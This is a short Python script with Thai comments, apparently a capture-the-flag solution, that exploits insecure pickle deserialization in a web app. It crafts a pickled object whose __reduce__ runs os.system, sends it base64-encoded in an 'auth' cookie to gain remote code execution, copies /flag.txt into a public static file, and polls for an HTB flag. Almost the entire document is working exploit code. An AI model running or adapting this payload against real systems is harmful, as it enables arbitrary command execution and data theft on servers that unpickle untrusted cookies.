import requests
import pickle
import base64
import os
import time

# เปลี่ยน URL ให้ตรงกับ target ของคุณ
url = 'http://127.0.0.1:1337'

# Payload - คำสั่งที่จะรัน
payload = f'cat /flag.txt > /app/application/static/js/flag2.txt'

class RCE:
    def __reduce__(self):
        cmd = payload
        return os.system, (cmd,)

def exploit():
    # สร้าง pickle payload
    pickled = pickle.dumps(RCE())
    
    # ส่ง request พร้อม malicious cookie
    r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
    
    print(f"[*] Sent payload, response status: {r.status_code}")
    
    # รอให้คำสั่งทำงาน
    time.sleep(2)
    
    # ลองอ่าน flag จากตำแหน่งที่กำหนด
    while True:
        try:
            flag = requests.get(f'{url}/static/js/flag2.txt')
            if flag.status_code == 200 and 'HTB'.encode('utf-8') in flag.content:
                print('[*] Flag found!')
                print('[*] %s' % flag.content.decode('utf-8'))
                break
            else:
                print(f"[*] Flag file not ready yet, status: {flag.status_code}")
        except Exception as e:
            print(f"[*] Error reading flag: {e}")
        
        time.sleep(5)

# เรียกใช้ exploit
exploit()